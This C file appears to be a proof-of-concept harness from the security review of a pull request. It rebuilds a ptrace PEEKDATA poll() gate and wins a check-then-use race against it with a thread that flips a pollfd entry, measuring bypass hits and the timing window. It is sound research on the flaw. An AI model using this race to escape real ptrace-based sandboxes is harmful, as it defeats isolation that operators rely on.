/* poc207_t123.c — v5.3-5: T1–T3 multi-threaded PoC for PR #207 bootstrap_poll_allowed.
 *
 * Standalone harness (OUR repo only; zero writes inside the PR #207 tree).
 * Replicates ginux-init's PEEKDATA gate (channel_hooks.rs:13-37, MAX=16,
 * reject fd>2, fail-closed) in a ptrace SYSEMU supervisor, then races it
 * against a two-thread tracee whose sibling flips fds[1].fd without pause.
 *
 *   T1 (divergence detector): gate snapshot says fd==0 but the kernel's poll()
 *      copies the LIVE slot (sentinel 0x7ffffffe) -> revents==POLLNVAL while
 *      validated-as-0. >=1 hit in N iterations = race proven won.
 *   T2 (window width): CLOCK_MONOTONIC around the PEEKDATA gate loop up to the
 *      SYSEMU_SINGLESTEP resume = check-to-kernel-copy window; min/med/max ns.
 *   T3 (real-fd probe): fds[1].fd toggles 0<->3 where fd3 = a real fifo read
 *      end (writer already closed => POLLHUP). snapshot-0 + POLLHUP = kernel
 *      acted on a real descriptor >2 that the gate never allowed.
 *
 * MEASURED/INFERRED discipline: all counts printed are MEASURED on the runner;
 * generalization to ginux's fd-table invariant stays INFERRED (harness-only).
 * Build: cc -O2 -Wall -o poc207_t123 poc207_t123.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <poll.h>
#include <sys/wait.h>
#include <linux/ptrace.h>

#define MAX_BOOTSTRAP_POLL_FDS 16      /* ginux-core/src/lib.rs:5 */
#define SENTINEL 0x7ffffffe            /* >2, positive, poll() => POLLNVAL */
#define SYS_POLL_X86_64 7

static int  g_mode_t3   = 0;           /* 1 => toggle 0<->real fd3 instead of 0<->sentinel */
static long g_iters     = 1000000;
static long g_wall_cap_s = 480;

static void die(const char *m){ perror(m); _exit(111); }

static double now_s(void){
  struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts);
  return (double)ts.tv_sec + (double)ts.tv_nsec/1e9;
}

/* ---------------- tracee ---------------- */
struct pollfd g_fds[2];
static volatile int g_run = 1;

static int sibling_fn(void *arg){
  (void)arg;
  unsigned s = SENTINEL;
  while (__atomic_load_n(&g_run, __ATOMIC_RELAXED)) {
    __atomic_store_n(&g_fds[1].fd, 0, __ATOMIC_RELAXED);
    syscall(SYS_sched_yield);
    __atomic_store_n(&g_fds[1].fd, g_mode_t3 ? 3 : (int)s, __ATOMIC_RELAXED);
    syscall(SYS_sched_yield);
  }
  syscall(SYS_exit, 0);
  return 0;
}

static int tracee_main(void){
  setvbuf(stdout,NULL,_IONBF,0);
  raise(SIGSTOP);   /* park until the supervisor SEIZEs us */
  if (g_mode_t3) {
    int fd = open("/tmp/poc207-fifo", O_RDONLY | O_NONBLOCK);
    if (fd != 3) { dprintf(2,"T3 setup: expected fd 3, got %d (errno %d)\n", fd, errno); _exit(112); }
  }
  g_fds[0].fd = 0; g_fds[0].events = POLLIN; g_fds[0].revents = 0;
  g_fds[1].fd = 0; g_fds[1].events = POLLIN; g_fds[1].revents = 0;

  size_t ssz = 256*1024;
  char *stk = mmap(NULL, ssz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (stk == MAP_FAILED) die("mmap");
  int tid = clone(sibling_fn, stk+ssz,
      CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM, NULL);
  if (tid < 0) die("clone");

  for (long i=0;i<g_iters;i++) {
    g_fds[1].revents = 0;
    syscall(SYS_poll, g_fds, 2, 0);
  }
  __atomic_store_n(&g_run, 0, __ATOMIC_RELAXED);
  struct timespec ts = {0, 200*1000*1000}; nanosleep(&ts, NULL);
  _exit(0);
}

/* ---------------- supervisor ---------------- */
static pid_t g_leader, g_sibling_tid;
struct wins { double *v; size_t n, cap; };
static struct wins g_win;
static void win_push(double ns){
  if (g_win.n == g_win.cap) {
    g_win.cap = g_win.cap ? g_win.cap*2 : 4096;
    g_win.v = realloc(g_win.v, g_win.cap*sizeof(double));
    if (!g_win.v) die("realloc");
  }
  g_win.v[g_win.n++] = ns;
}
static int cmpd(const void *a, const void *b){
  double x = *(const double*)a, y = *(const double*)b;
  return x<y?-1:(x>y?1:0);
}

static long peek_word(pid_t t, unsigned long addr, unsigned long *out){
  errno = 0;
  long w = ptrace(PTRACE_PEEKDATA, t, (void*)addr, NULL);
  if (errno) return -1;                    /* fail-closed like channel_hooks */
  *out = (unsigned long)w;
  return 0;
}

int main(int argc, char **argv){
  if (getenv("POC207_TRACEE")) return tracee_main();
  if (argc > 1) g_iters = strtol(argv[1], NULL, 0);
  if (argc > 2) g_mode_t3 = atoi(argv[2]);

  if (g_mode_t3) {
    unlink("/tmp/poc207-fifo");
    if (mkfifo("/tmp/poc207-fifo", 0600)) die("mkfifo");
    /* a nonblocking writer open fails ENXIO on a writer-less fifo: hold a dummy
       reader first, then open+close the writer so the tracee's later poll on
       its own read end returns POLLHUP deterministically */
    int rd0 = open("/tmp/poc207-fifo", O_RDONLY | O_NONBLOCK);
    if (rd0 < 0) die("open fifo dummy reader");
    int w = open("/tmp/poc207-fifo", O_WRONLY | O_NONBLOCK);
    if (w < 0) die("open fifo writer");
    close(w);
    (void)rd0; /* held until process exit; does not affect tracee POLLHUP */
  }

  g_leader = fork();
  if (g_leader < 0) die("fork");
  if (g_leader == 0) {
    char iters[32]; snprintf(iters,sizeof iters,"%ld",g_iters);
    char t3[8];     snprintf(t3,sizeof t3,"%d",g_mode_t3);
    setenv("POC207_TRACEE","1",1);
    execl("/proc/self/exe","poc207-tracee",iters,t3,(char*)NULL);
    _exit(110);
  }

  int st;
  /* child parks itself with SIGSTOP right after exec; WUNTRACED is required
     to see that job-control stop from a non-traced child */
  if (waitpid(g_leader,&st,WUNTRACED)<0) die("wait pre-stop");
  if (getenv("POC207_DEBUG")) fprintf(stderr,"PREWAIT st=0x%x stopped=%d sig=%d exited=%d code=%d\n", st, WIFSTOPPED(st), WIFSTOPPED(st)?WSTOPSIG(st):0, WIFEXITED(st), WIFEXITED(st)?WEXITSTATUS(st):-1);
  if (!WIFSTOPPED(st)) { fprintf(stderr,"child did not stop\n"); kill(g_leader,SIGKILL); _exit(110); }
  /* attach via SEIZE, then resume straight into emulation */
  if (ptrace(PTRACE_SEIZE, g_leader, NULL,
        (void*)(unsigned long)(PTRACE_O_TRACESYSGOOD|PTRACE_O_TRACECLONE))) die("SEIZE");
  /* seizing a group-stopped tracee re-reports it as PTRACE_EVENT_STOP: consume
     that stop BEFORE the first emulation resume (resume-before-delivery races
     the tracer bookkeeping) */
  if (waitpid(g_leader,&st,__WALL)<0) die("wait seize-stop");
  fprintf(stderr,"FIRST_EVENT st=0x%x\n", st);
  if (ptrace(PTRACE_SYSEMU, g_leader, NULL, NULL)) die("SYSEMU resume");

  long polls=0, denied=0, t1_hits=0, t3_hits=0, snap_sentinel=0, peek_fail=0;
  double t0 = now_s();
  int leader_live = 1;

  while (leader_live) {
    if (now_s() - t0 > (double)g_wall_cap_s) break;
    pid_t t = waitpid(-1, &st, __WALL);
    if (t < 0) { if (errno==EINTR) continue; die("waitpid"); }

    if (WIFEXITED(st) || WIFSIGNALED(st)) {
      if (getenv("POC207_DEBUG")) fprintf(stderr,"DEAD t=%d exited=%d sig=%d leader=%d\n", t, WIFEXITED(st)?WEXITSTATUS(st):-1, WIFSIGNALED(st)?WTERMSIG(st):-1, t==g_leader);
      if (t == g_leader) leader_live = 0;
      continue;
    }
    int sig = WSTOPSIG(st);
    unsigned event = (unsigned)st >> 16;
    if (getenv("POC207_DEBUG")) fprintf(stderr,"EV t=%d sig=%d event=%u\n", t, sig, event);

    if (sig == SIGTRAP && event == PTRACE_EVENT_CLONE) {
      unsigned long ntid = 0;
      ptrace(PTRACE_GETEVENTMSG, t, NULL, &ntid);
      g_sibling_tid = (pid_t)ntid;
      ptrace(PTRACE_SYSEMU, (pid_t)ntid, NULL, NULL);
      ptrace(PTRACE_SYSEMU, t, NULL, NULL);
      continue;
    }
    if (sig == SIGTRAP && event == PTRACE_EVENT_EXIT) {
      ptrace(PTRACE_CONT, t, NULL, NULL);
      continue;
    }
    /* group/signal stops: swallow benign ones; faults are fatal and reported */
    if (sig != (SIGTRAP|0x80)) {
      if (sig == SIGSEGV || sig == SIGILL || sig == SIGBUS || sig == SIGFPE) {
        fprintf(stderr,"FATAL tracee fault sig=%d tid=%d (aborting harness run)\n", sig, t);
        kill(g_leader, SIGKILL);
        leader_live = 0;
        break;
      }
      ptrace(PTRACE_SYSEMU, t, NULL, NULL);
      continue;
    }

    /* syscall stop: classify */
    struct ptrace_syscall_info si; memset(&si,0,sizeof si);
    if (ptrace(PTRACE_GET_SYSCALL_INFO, t, (void*)sizeof si, &si) < 0) {
      ptrace(PTRACE_SYSEMU, t, NULL, NULL); continue;
    }
    if (getenv("POC207_DEBUG")) fprintf(stderr,"SC t=%d op=%d nr=%lld\n", t, si.op, (long long)si.entry.nr);
    if (si.op != PTRACE_SYSCALL_INFO_ENTRY || si.entry.nr != SYS_POLL_X86_64) {
      /* pass through this one syscall, keep emulating */
      if (getenv("POC207_DEBUG")) {
        fprintf(stderr,"PASS-STEP t=%d nr=%lld", t, (long long)si.entry.nr);
        if (si.entry.nr == 1) {
          struct user_regs_struct rr; char pbuf[80]={0};
          if (ptrace(PTRACE_GETREGS, t, NULL, &rr)==0) {
            for (int k=0;k<60;k++){ long w = ptrace(PTRACE_PEEKDATA,t,(void*)(rr.rsi+k),NULL); if(errno) break; pbuf[k]=(char)w; if(!pbuf[k]) break; }
            fprintf(stderr," fd=%lld buf=\"%s\"", (long long)rr.rdi, pbuf);
          }
        }
        fprintf(stderr,"\n");
      }
      /* SYSEMU passthrough idiom: one PTRACE_SYSCALL round-trip executes the
         syscall; SYSEMU_SINGLESTEP does NOT execute it (rax stays -ENOSYS). */
      if (ptrace(PTRACE_SYSCALL, t, NULL, NULL)) die("SYSCALL passthrough");
      if (waitpid(t,&st,__WALL)<0) die("wait after passthrough");
      if (WIFEXITED(st) || WIFSIGNALED(st)) { if (t==g_leader) leader_live=0; break; }
      if (getenv("POC207_DEBUG")) fprintf(stderr,"PASS-RESUME t=%d sig=%d\n", t, WSTOPSIG(st));
      if (ptrace(PTRACE_SYSEMU, t, NULL, NULL)) die("SYSEMU passthrough resume");
      continue;
    }

    /* ---- the gate: replica of channel_hooks.rs:13-37 ---- */
    unsigned long addr = si.entry.args[0];
    unsigned long count = si.entry.args[1];
    polls++;
    int allow = 1;
    if (count > MAX_BOOTSTRAP_POLL_FDS) allow = 0;
    unsigned long w0=0, w1=0; int have1 = 0; (void)w0;
    double gw0 = now_s();
    for (unsigned long i=0; allow && i<count; i++) {
      unsigned long word;
      if (peek_word(t, addr + i*8, &word)) { allow = 0; peek_fail++; break; }
      int32_t fd = (int32_t)(word & 0xffffffffUL);
      if (fd > 2) { allow = 0; break; }
      if (i==0) w0 = word;
      if (i==1) { w1 = word; have1 = 1; }
    }
    double gw1 = now_s();
    win_push((gw1-gw0)*1e9);

    int32_t snap1 = have1 ? (int32_t)(w1 & 0xffffffffUL) : 0;
    if (have1 && snap1 > 2) snap_sentinel++;

    if (!allow) {
      denied++;
      struct user_regs_struct r;
      if (ptrace(PTRACE_GETREGS, t, NULL, &r)==0) {
        r.rax = (long long)-EBUSY;                /* emulated failure, tracee ignores */
        ptrace(PTRACE_SETREGS, t, NULL, &r);
      }
      ptrace(PTRACE_SYSEMU, t, NULL, NULL);       /* skip the syscall */
      continue;
    }

    /* allowed -> the kernel executes poll() NOW against live tracee memory */
    ptrace(PTRACE_SYSCALL, t, NULL, NULL);
    if (waitpid(t,&st,__WALL)<0) die("wait poll exec");
    if (WIFEXITED(st) || WIFSIGNALED(st)) { if (t==g_leader) leader_live=0; break; }
    double gw2 = now_s();
    win_push((gw2-gw1)*1e9);

    if (have1) {
      unsigned long wpost;
      if (peek_word(t, addr + 8, &wpost)==0) {
        int32_t fd_post = (int32_t)(wpost & 0xffffffffUL);
        uint16_t revents = (uint16_t)((wpost >> 48) & 0xffffUL);
        if (snap1 <= 2 && revents != 0 && fd_post > 2) {
          if (g_mode_t3) t3_hits++;
          else t1_hits++;
        }
      }
    }
    ptrace(PTRACE_SYSEMU, t, NULL, NULL);         /* resume emulating */
  }

  /* kill anything left */
  kill(g_leader, SIGKILL);
  if (g_sibling_tid) { ptrace(PTRACE_KILL, g_sibling_tid, NULL, NULL); }

  /* T2 stats */
  qsort(g_win.v, g_win.n, sizeof(double), cmpd);
  double med = g_win.n ? g_win.v[g_win.n/2] : 0;
  double mn  = g_win.n ? g_win.v[0] : 0;
  double mx  = g_win.n ? g_win.v[g_win.n-1] : 0;
  printf("RESULT mode=%s iterations_cap=%ld wall_s=%.1f\n",
         g_mode_t3?"T3":"T1", g_iters, now_s()-t0);
  printf("RESULT polls=%ld denied_by_gate=%ld gate_snapshot_sentinel=%ld peek_failures=%ld\n",
         polls, denied, snap_sentinel, peek_fail);
  printf("RESULT %s divergences=%ld\n", g_mode_t3?"T3_hits":"T1_hits", g_mode_t3?t3_hits:t1_hits);
  printf("RESULT T2_window_ns pre_resume_n=%zu med=%.0f min=%.0f max=%.0f | exec_to_read_n=%zu\n",
         g_win.n/2, med, mn, mx, g_win.n - g_win.n/2);
  printf("VERDICT %s\n",
    (g_mode_t3 ? (t3_hits>0 ? "RACE-WON-ON-REAL-FD: proven (harness)" : "no divergence observed (harness)")
               : (t1_hits>0 ? "RACE-WON: pollfd changed between PEEKDATA gate and kernel copy (proven, harness)"
                            : "no divergence observed (harness)")));
  return 0;
}
